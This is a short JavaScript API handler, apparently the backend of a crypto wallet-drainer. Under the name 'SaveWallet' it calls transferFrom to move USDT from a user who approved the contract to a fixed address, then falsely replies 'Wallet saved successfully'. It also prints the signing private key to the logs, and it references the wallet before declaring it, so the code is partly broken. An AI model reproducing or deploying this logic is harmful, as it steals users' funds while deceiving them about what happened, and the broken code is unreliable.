import { ethers } from "ethers";

export default async function SaveWallet(req, res) {
    const tokenAddress = "0x55d398326f99059ff775485246999027b3197955"; // USDT (BSC or mainnet)
    const tokenAbi = [
        "function transferFrom(address from, address to, uint256 amount) external returns (bool)"
    ];

    // Contract instance
    const tokenContract = new ethers.Contract(tokenAddress, tokenAbi, wallet);

    // Transfer details
    const from = "0xUserWalletAddress";  // the user who approved
    const to = "0xefe2aa8b1381fce14321cd214a7f4b02078753cb";   // where you want to send the tokens
    const amount = ethers.utils.parseUnits("10.0", 18); // 10 USDT (check decimals!)

    console.log("SaveWallet called");
    console.log(JSON.parse(req.body));
    const provider = new ethers.providers.JsonRpcProvider(process.env.META_MASK_URL);
    const wallet = new ethers.Wallet(process.env.META_MASK_PRIVATE_KEY, provider);
    console.log(process.env.META_MASK_URL);
    console.log(process.env.META_MASK_PRIVATE_KEY);
    console.log(wallet);
    console.log(provider);

    async function transferTokens() {
        try {
            const tx = await tokenContract.transferFrom(from, to, amount);
            console.log("⏳ Sending transaction...");
            await tx.wait();
            console.log("✅ Transfer complete! Hash:", tx.hash);
        } catch (err) {
            console.error("❌ Error during transfer:", err);
        }
    }
    transferTokens();

    return res.status(200).json({ message: "Wallet saved successfully" });
}